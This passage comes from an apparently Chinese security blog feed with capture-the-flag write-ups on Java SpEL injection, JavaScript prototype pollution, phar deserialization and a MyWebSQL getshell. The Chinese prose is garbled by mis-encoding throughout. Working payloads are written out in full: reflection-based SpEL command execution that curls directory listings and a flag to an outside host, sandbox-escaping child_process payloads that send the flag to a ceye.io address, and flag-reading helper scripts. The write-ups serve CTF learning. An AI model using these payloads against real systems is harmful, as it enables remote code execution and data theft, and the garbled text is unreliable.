class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">            $rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>ç»§ç»­è·Ÿè¿›<code>config[&#39;catcherFieldName&#39;]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;catcherFieldName&quot;: &quot;source&quot;, /* æäº¤çš„å›¾ç‰‡åˆ—è¡¨è¡¨å•åç§° */</span><br></pre></td></tr></table></figure></li><li><p>å¯ä»¥çœ‹åˆ°è·¯å¾„ä¸Šæ— è¿‡æ»¤ï¼Œå› æ­¤å‚æ•°å¯æ§ï¼Œå¯ä»¥åœ¨è¿™ä¸ªç‚¹ä½¿ç”¨pharæ¥getshellï¼Œè¿›è€Œå°±æœ‰äº†ä¸Šé¢çš„pop chainæ„é€ </p></li><li>getshell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/78ed78f65afaa8137864b4839f2076a8/201904/14/9a032ef2cab676e1f622.gif</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://i.loli.net/2020/06/04/8FTaxUZ2pXgVstD.png" alt="539A5C5E-7729-494B-AD76-2BF98165A8D9.png"></p><p><img src="https://i.loli.net/2020/06/04/2v1Q5BEhLMrf7Wy.png" alt="51E3D681-D424-4298-B85A-5398B9B0684F.png"></p><p>å…¶å®ƒpop chainå‚è€ƒ <a href="http://m4p1e.com/web/20181224.html" target="_blank" rel="noopener">ã€Šlumenserialâ€“evilã€‹</a></p><h2 id="0x07-javacon"><a href="#0x07-javacon" class="headerlink" title="0x07 javacon"></a>0x07 javacon</h2><h3 id="1-ç¯å¢ƒé…ç½®-1"><a href="#1-ç¯å¢ƒé…ç½®-1" class="headerlink" title="1. ç¯å¢ƒé…ç½®"></a>1. ç¯å¢ƒé…ç½®</h3><p>ä½¿ç”¨ideaæ‰“å¼€è¿™ä¸ªé¡¹ç›®ï¼Œä¹‹åå³é”®jaråŒ…é€‰æ‹©Add as Libraryï¼Œä¹‹åå°±å¯ä»¥åˆ†æå…¶ä¸­çš„æºä»£ç äº†ã€‚</p><p><img src="https://i.loli.net/2020/06/04/RWBNjZwgYerDVUv.png" alt="5FC1A049-960A-4451-90BA-F4557B18B826.png"></p><p>é…ç½®è¿›è¡Œè¿œç¨‹è°ƒè¯•<br><img src="https://i.loli.net/2020/06/04/do6mDh1Qrb4ZkON.png" alt="9EDB41F3-F006-4004-8FD6-B8B8208658C1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</span><br></pre></td></tr></table></figure><p>å‘½ä»¤å¯åŠ¨<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,<span class="built_in">suspend</span>=y -jar challenge-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure></p><p>ä¹‹åç‚¹å‡»DEBUGå¼€å§‹è°ƒè¯•</p><h3 id="2-æ¼æ´ç›¸å…³çŸ¥è¯†ç‚¹"><a href="#2-æ¼æ´ç›¸å…³çŸ¥è¯†ç‚¹" class="headerlink" title="2. æ¼æ´ç›¸å…³çŸ¥è¯†ç‚¹"></a>2. æ¼æ´ç›¸å…³çŸ¥è¯†ç‚¹</h3><h4 id="2-1-ELè¡¨è¾¾å¼"><a href="#2-1-ELè¡¨è¾¾å¼" class="headerlink" title="2.1 ELè¡¨è¾¾å¼"></a>2.1 ELè¡¨è¾¾å¼</h4><h4 id="2-2-SpELè¡¨è¾¾å¼æ³¨å…¥"><a href="#2-2-SpELè¡¨è¾¾å¼æ³¨å…¥" class="headerlink" title="2.2 SpELè¡¨è¾¾å¼æ³¨å…¥"></a>2.2 SpELè¡¨è¾¾å¼æ³¨å…¥</h4><p>å‚è€ƒï¼š<a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">ã€Šç”±æµ…å…¥æ·±SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‹</a></p><h4 id="2-3-åå°„"><a href="#2-3-åå°„" class="headerlink" title="2.3 åå°„"></a>2.3 åå°„</h4><p>å‚è€ƒï¼š<a href="http://rui0.cn/archives/1112" target="_blank" rel="noopener">ã€Šæ·±å…¥ç†è§£Javaåå°„ä¸­çš„invokeæ–¹æ³•ã€‹</a></p><h3 id="3-æ¼æ´è°ƒè¯•åˆ†æ"><a href="#3-æ¼æ´è°ƒè¯•åˆ†æ" class="headerlink" title="3. æ¼æ´è°ƒè¯•åˆ†æ"></a>3. æ¼æ´è°ƒè¯•åˆ†æ</h3><p>å¯ä»¥çœ‹å‡ºæ˜¯åŸºäºSpringæ¡†æ¶ç¼–å†™çš„ä»£ç ï¼Œæ‰€ä»¥é¦–å…ˆæŸ¥çœ‹å…¶é…ç½®æ–‡ä»¶application.yml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  thymeleaf:</span><br><span class="line">    encoding: UTF-8</span><br><span class="line">    cache: false</span><br><span class="line">    mode: HTML</span><br><span class="line">keywords:</span><br><span class="line">  blacklist:</span><br><span class="line">    - java.+lang</span><br><span class="line">    - Runtime</span><br><span class="line">    - exec.*\(</span><br><span class="line">user:</span><br><span class="line">  username: admin</span><br><span class="line">  password: admin</span><br><span class="line">  rememberMeKey: c0dehack1nghere1</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ä¸­å†™äº†ä¸€ä¸ªé»‘åå•å’Œä¸€ä¸ªç”¨æˆ·ä¿¡æ¯</p><blockquote><p>SmallEvaluationContext ç»§æ‰¿ StandardEvaluationContextï¼Œä¸»è¦æ˜¯æä¾›ä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œç›¸å½“äºä¸€ä¸ªå®¹å™¨ã€‚<br>ChallengeApplication ç”¨äºå¯åŠ¨<br>Encryptor åŠ å¯†è§£å¯†å·¥å…·ç±»<br>KeyworkProperties ä½¿ç”¨é»‘åå•æ—¶éœ€è¦<br>UserConfig ç”¨æˆ·æ¨¡å‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨RemberMeæ—¶ä½¿ç”¨äº†Encryptor<br>å¼•ç”¨è‡ªï¼š<a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">http://rui0.cn/archives/1015</a></p></blockquote><p>ä¸»è¦ä»MainControllerå¼€å§‹çœ‹å…¶åŠŸèƒ½å®ç°</p><p><img src="https://i.loli.net/2020/06/04/1cQKxe8DtFWPngT.png" alt="æˆªå±2019-10-15ä¸‹åˆ10.09.05.png"></p><p>æ­¤å¤„çš„äº†æ¼æ´ä¸»è¦æ˜¯SpELè¡¨è¾¾å¼é—®é¢˜ï¼Œä½†æ˜¯å› ä¸ºæœ‰é»‘åå•çš„é™åˆ¶ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨åå°„æ¥æ‹¼æ¥payloadè¾¾åˆ°ç»•è¿‡çš„ç›®çš„ã€‚</p><p>å¸¸è§„rceæ–¹å¼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨åå°„æ‹¼æ¥çš„æ–¹å¼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;curl http://i.zeye.xyz/test&quot;);</span><br></pre></td></tr></table></figure></p><p>PS: ä¸€ä¸ªå‘ç‚¹ï¼Œåœ¨JAVAä¸­Runtimeä¸­execå¯¹å¤æ‚ä¸€ç‚¹çš„linuxå‘½ä»¤æ‰§è¡Œä¸äº†â€¦æˆ‘ä»¬éœ€è¦å°†å…¶å‚æ•°æ”¹æˆå¦‚ä¸‹æ‰å¯ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new String[]&#123;&quot;/bin/bash\&quot;,&quot;-c&quot;,&quot;xxxxx&quot;&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åæ„é€ çš„payloadå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#&#123;T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]&#123;\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl http://i.zeye.xyz/`cd / &amp;&amp; ls|base64|tr &apos;\\n&apos; &apos;-&apos;`\&quot;&#125;)&#125;&quot;));</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆåˆ©ç”¨payloadå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl http://i.zeye.xyz/`cat flag_j4v4_chun|base64|tr &apos;\n&apos; &apos;-&apos;`&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure></p><p>å‚è€ƒï¼š<a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">ã€ŠCode-Breaking Puzzles â€” javacon WriteUpã€‹</a></p><h2 id="0x08-thejs"><a href="#0x08-thejs" class="headerlink" title="0x08 thejs"></a>0x08 thejs</h2><h3 id="1-æ¼æ´ç›¸å…³çŸ¥è¯†ç‚¹"><a href="#1-æ¼æ´ç›¸å…³çŸ¥è¯†ç‚¹" class="headerlink" title="1. æ¼æ´ç›¸å…³çŸ¥è¯†ç‚¹"></a>1. æ¼æ´ç›¸å…³çŸ¥è¯†ç‚¹</h3><p>åŸå‹é“¾æ±¡æŸ“ï¼Œå› ä¸ºJavaScriptæ˜¯ä½¿ç”¨åŸå‹é“¾æœºåˆ¶æ¥å®ç°ç»§æ‰¿çš„ï¼Œå› æ­¤å°±å¯èƒ½ä¼šåœ¨<strong>èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œ</strong>å¤„å­˜åœ¨å¯æ±¡æŸ“ç‚¹ã€‚</p><p>è¯¦ç»†åˆ†æå‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">ã€Šæ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»ã€‹</a></p><h3 id="2-é¢˜ç›®è§£ç­”"><a href="#2-é¢˜ç›®è§£ç­”" class="headerlink" title="2. é¢˜ç›®è§£ç­”"></a>2. é¢˜ç›®è§£ç­”</h3><p>å¦‚æœæƒ³è¦ä¿®æ”¹çˆ¶å¯¹è±¡çš„åŸå‹ï¼Œæœ‰å¦‚ä¸‹ä¸¤ç§æ–¹å¼</p><ol><li><code>inst.constructor.prototype</code> </li><li><code>inst.__proto__</code><br>é‚£ä¹ˆæ¨å¹¿ä¸€ä¸‹çš„è¯ï¼Œåˆæœ‰å¦‚ä¸‹ä¸¤ç§æ–¹å¼</li><li><code>inst[constructor][prototype][]</code></li><li><code>inst[__proto__][]</code><br>æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´åªè¦æ‰¾å¯¹æ•°ç»„è¿›è¡Œæ“ä½œçš„åœ°æ–¹ï¼Œæˆ‘ä»¬å°±æœ‰å¯èƒ½å®Œæˆå¯¹åŸå‹çš„æ±¡æŸ“ã€‚ä½†æ˜¯è¿˜è¦æ³¨æ„çš„æ˜¯æƒ³åŠæ³•èµ‹å€¼çš„<code>__proto__</code>å¯¹è±¡å¹¶ä¸æ˜¯çœŸæ­£çš„è¿™ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æƒ³è¦å†™åˆ°çœŸæ­£çš„<code>__proto__</code>ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¸€å±‚èµ‹å€¼ã€‚</li></ol><p>æ‰€ä»¥æ¥ä¸‹æ¥æ„é€ æ”»å‡»é“¾çš„æ€è·¯æ˜¯: æ‰¾åˆ°ä¸€ä¸ªæœªå®šä¹‰çš„å˜é‡ï¼Œä½†æ˜¯è¿™ä¸ªå˜é‡è¦åœ¨åé¢è¢«è°ƒç”¨ã€‚</p><p>ç»è¿‡åˆ†æå‘ç°<code>sourceURL</code>æ˜¯æœªå®šä¹‰çš„ã€‚</p><p><img src="https://i.loli.net/2020/06/04/TJKoxFlDg6CupI5.png" alt="971DD02B-9513-4415-B169-D86B9863C087.png"></p><p>ç¨‹åºä¸­åªæœ‰ä¸€ä¸ªè¾“å…¥ç‚¹ä¹Ÿå°±æ˜¯<code>req.body</code>ï¼Œä¹‹åç»è¿‡<code>lodash.merge</code>å°†ä¸¤ä¸ªå¯¹è±¡è¿›è¡Œåˆå¹¶<br><img src="https://i.loli.net/2020/06/04/i9dxGr36fVF8ktJ.png" alt="å±å¹•å¿«ç…§ 2019-09-05 ä¸Šåˆ10.53.41.png"></p><p>åé¢å¯ä»¥çœ‹åˆ°<code>sourceURL</code>åœ¨åˆ¤æ–­ä¸­è¢«è°ƒç”¨<br><img src="https://i.loli.net/2020/06/04/cG57yEqtanx9bV3.png" alt="A6DD32B7-C1A1-45E2-BF7F-F2526CA3956E.png"></p><p>å› è€ŒæˆåŠŸé€ æˆåŸå‹é“¾æ±¡æŸ“ï¼Œä¹‹ååœ¨æ¨¡æ¿æ¸²æŸ“ä¸­çš„<code>Function</code>å‡½æ•°ä¸­å°†é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶å°ä¸­ç®€å•æµ‹è¯•ä¸€ä¸‹</p><p><img src="https://pic.downk.cc/item/5ed863e9c2a9a83be5b390ba.png" alt></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œnodejsä¸­å¯ä»¥ç›´æ¥é€šè¿‡requireå¯¼å…¥åŒ…æ¥è¾¾åˆ°rceçš„æ•ˆæœï¼Œå¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://pic.downk.cc/item/5ed8640ac2a9a83be5b3b4e6.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ­¤é¢˜ç¯å¢ƒä¸­æœ‰æ²™ç®±å¯¹æ­¤è¿›è¡Œäº†é™åˆ¶ï¼Œå› æ­¤å¦‚ä¸‹payloadæ˜¯æ— æ³•æˆåŠŸçš„ã€‚éœ€è¦å¯¹æ²™ç®±ç¯å¢ƒè¿›è¡Œbypass<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot; : &#123;&quot;sourceURL&quot; : &quot;\r\nreturn e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.require(&apos;child_process&apos;).execSync(&apos;whoami&apos;).toString()&#125;\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>æ•ˆæœ<br><img src="https://pic.downk.cc/item/5ed86424c2a9a83be5b3d1d4.png" alt></p><p>bypassçš„payloadå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://xz.aliyun.com/t/4361" target="_blank" rel="noopener">https://xz.aliyun.com/t/4361</a></p><p>æœ€ç»ˆæ„é€ ä¸¤ä¸ªpayloadå¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot; : &#123;&quot;sourceURL&quot; : &quot;\r\nreturn e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;ls&apos;).toString()&#125;\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require(&apos;child_process&apos;).execSync(&apos;cat /flag_thepr0t0js&apos;).toString();var req = require(&apos;http&apos;).request(`http://xxxx.ceye.io/$&#123;result&#125;`);req.end();\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„è¿˜æœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼Œå°±æ˜¯åŸå‹é“¾æ±¡æŸ“ä¹‹åï¼Œé™¤éé‡å¯ç¯å¢ƒï¼Œå¦åˆ™æ”»å‡»æ•ˆæœä¸€ç›´éƒ½åœ¨ï¼Œä¹Ÿå°±æ˜¯ä½ è¯»å–çš„flagå°†ä¸€ç›´æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œæ‰€ä»¥å¿…é¡»åœ¨æ±¡æŸ“ä¹‹åå°†å˜é‡æ¢å¤ï¼Œçœçš„æ³„éœ²æˆ‘ä»¬çš„flagã€‚ï¼ˆè¿™ä¹Ÿå°±æ˜¯ä¸Šé¢forå¾ªç¯è¿›è¡Œdeleteçš„åŸå› ï¼‰</p><p><img src="https://pic.downk.cc/item/5ed86439c2a9a83be5b3e7ba.png" alt></p><h3 id="3-å‚è€ƒ"><a href="#3-å‚è€ƒ" class="headerlink" title="3. å‚è€ƒ"></a>3. å‚è€ƒ</h3><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">ã€Šæ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»ã€‹</a></p><p><a href="https://lorexxar.cn/2018/12/07/codingbreak-wp/#hard-thejs" target="_blank" rel="noopener">ã€ŠCode BreakingæŒ‘æˆ˜èµ› Writeupã€‹</a></p><p><a href="http://adm1n.design/2019/05/07/proto2/" target="_blank" rel="noopener">ã€ŠJavaScript Prototype æ±¡æŸ“æ”»å‡» ä¹‹ Code-Breaking-TheJSç¯‡ã€‹</a></p><h2 id="0x09-picklecode"><a href="#0x09-picklecode" class="headerlink" title="0x09 picklecode"></a>0x09 picklecode</h2><p>å®³ï¼Œè¿™ä¸ªå…ˆä¸å†™äº†ï¼Œæœ‰æ—¶é—´å†è¡¥å§</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00å‰è¨€&quot;&gt;&lt;/a&gt;0x00å‰è¨€&lt;/h2&gt;&lt;p&gt;é¢˜ç›®çŸ¥è¯†ç‚¹æ¦‚è¿°ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;function PHPå‡½æ•°åˆ©ç”¨æŠ€å·§&lt;/li&gt;
&lt;li&gt;pcre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 starctf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/</id>
    <published>2019-09-14T16:07:18.000Z</published>
    <updated>2019-09-14T16:09:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è¿™æ¬¡çš„é¢˜ç›®çœŸçš„è®©æˆ‘å­¦äº†å¥½ä¹…ï¼Œå“ˆå“ˆ</p><p>ç¯å¢ƒéƒ¨ç½²ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t echohub:lastest .</span><br><span class="line">docker run -p 10080:80 -tid echohub</span><br><span class="line"># è¿›å…¥å®¹å™¨æ‰§è¡Œå‘½ä»¤</span><br><span class="line">docker exec -it suspicious_noether /bin/bash</span><br></pre></td></tr></table></figure></p><h2 id="0x01-WEB"><a href="#0x01-WEB" class="headerlink" title="0x01 WEB"></a>0x01 WEB</h2><h3 id="1-mywebsql"><a href="#1-mywebsql" class="headerlink" title="1. mywebsql"></a>1. mywebsql</h3><p>ä¿¡æ¯æ”¶é›†ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[09:42:18] 200 -    1KB - /README.md</span><br><span class="line">[09:42:51] 301 -  323B  - /backups  -&gt;  http://34.92.36.201:10080/backups/</span><br><span class="line">[09:42:52] 200 -    3KB - /backups/</span><br><span class="line">[09:42:59] 301 -  322B  - /config  -&gt;  http://34.92.36.201:10080/config/</span><br><span class="line">[09:43:00] 200 -    3KB - /config/</span><br><span class="line">[09:43:12] 200 -    9KB - /favicon.ico</span><br><span class="line">[09:43:19] 301 -  319B  - /img  -&gt;  http://34.92.36.201:10080/img/</span><br><span class="line">[09:43:20] 200 -    6KB - /index.php</span><br><span class="line">[09:43:21] 200 -    6KB - /index.php/login/</span><br><span class="line">[09:43:22] 200 -    6KB - /install.php</span><br><span class="line">[09:43:23] 301 -  318B  - /js  -&gt;  http://34.92.36.201:10080/js/</span><br><span class="line">[09:43:24] 301 -  320B  - /lang  -&gt;  http://34.92.36.201:10080/lang/</span><br><span class="line">[09:43:24] 301 -  319B  - /lib  -&gt;  http://34.92.36.201:10080/lib/</span><br><span class="line">[09:43:31] 301 -  323B  - /modules  -&gt;  http://34.92.36.201:10080/modules/</span><br><span class="line">[09:43:48] 403 -  304B  - /server-status/</span><br><span class="line">[09:43:48] 403 -  303B  - /server-status</span><br><span class="line">[09:43:58] 301 -  322B  - /themes  -&gt;  http://34.92.36.201:10080/themes/</span><br><span class="line">[09:43:58] 301 -  319B  - /tmp  -&gt;  http://34.92.36.201:10080/tmp/</span><br><span class="line">[09:43:58] 200 -  936B  - /tmp/</span><br></pre></td></tr></table></figure></p><p>æºç :<br><a href="https://github.com/Samnan/MyWebSQL" target="_blank" rel="noopener">https://github.com/Samnan/MyWebSQL</a></p><p>å¯¼å‡ºå»ºè¡¨ï¼Œåˆ©ç”¨å¤‡ä»½åŠŸèƒ½getshell</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> Expect;</span><br><span class="line">$obj = Expect-&gt;spawn( <span class="string">"./tmp/readflag"</span> );</span><br><span class="line"><span class="comment"># $obj-&gt;exp_internal( 1 );</span></span><br><span class="line">@result&#123; <span class="string">"position"</span>, <span class="string">"error"</span>, <span class="string">"match"</span>, <span class="string">"before"</span>, <span class="string">"after"</span> &#125; =$obj-&gt;expect(<span class="number">1</span>,<span class="string">-re=&gt;</span>qr/\(\(.*\)\)/);</span><br><span class="line"><span class="comment"># print $result&#123;"match"&#125;;</span></span><br><span class="line">$res=<span class="keyword">eval</span>($result&#123;<span class="string">"match"</span>&#125;);</span><br><span class="line"><span class="comment"># print $res;</span></span><br><span class="line">$pos=$obj-&gt;expect(<span class="number">1</span>,</span><br><span class="line">       [ <span class="regexp">qr/input your answer:\s*$/i</span>, </span><br><span class="line">         <span class="function"><span class="keyword">sub</span></span>&#123; <span class="keyword">my</span> $self = <span class="keyword">shift</span>; $self-&gt;<span class="keyword">send</span>( $res.<span class="string">"\r"</span> ); exp_continue;&#125; </span><br><span class="line">       ], </span><br><span class="line">    );</span><br><span class="line"><span class="comment"># print $pos;</span></span><br><span class="line">$obj-&gt;soft_close( );</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/15/JXUqS5pBEOsPben.png" alt="65748B37-692A-4809-8794-A714FC111F3F.png"></p><p>perlæœ‰ä¸ªppå¯ä»¥ç›´æ¥æ‰“åŒ…æˆäºŒè¿›åˆ¶ç¨‹åºä¸Šä¼ æ‰§è¡Œå¾—åˆ°flag</p><p><img src="https://i.loli.net/2019/09/15/9VxGJh7HoBjg4iS.png" alt="å±å¹•å¿«ç…§ 2019-04-28 ä¸Šåˆ10.00.10.png"></p><p>phpçš„è¯å¯ä»¥åˆ©ç”¨å¦‚ä¸‹æ–¹å¼<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ä¸äºŒè¿›åˆ¶ç¨‹åºäº¤äº’çš„è„šæœ¬</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>), <span class="comment">// æ ‡å‡†è¾“å…¥ï¼Œå­è¿›ç¨‹ä»æ­¤ç®¡é“è¯»å–æ•°æ®</span></span><br><span class="line"><span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>), <span class="comment">//æ ‡å‡†è¾“å‡ºï¼Œå­è¿›ç¨‹å‘æ­¤ç®¡é“å†™å…¥æ•°æ®</span></span><br><span class="line"><span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"file"</span>, <span class="string">"/tmp/.a/errer-output.txt"</span>, <span class="string">"a"</span>), <span class="comment">//æ ‡å‡†é”™è¯¯ï¼Œå†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$cwd = <span class="string">'/'</span>;</span><br><span class="line">$env = arrat();</span><br><span class="line"></span><br><span class="line">$proess = proc_open(<span class="string">'/readflag'</span>, $descriptorspec, $pipes, $cwd, $env);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_resource($proess)) &#123;</span><br><span class="line">$a = fread($pipes[<span class="number">1</span>], <span 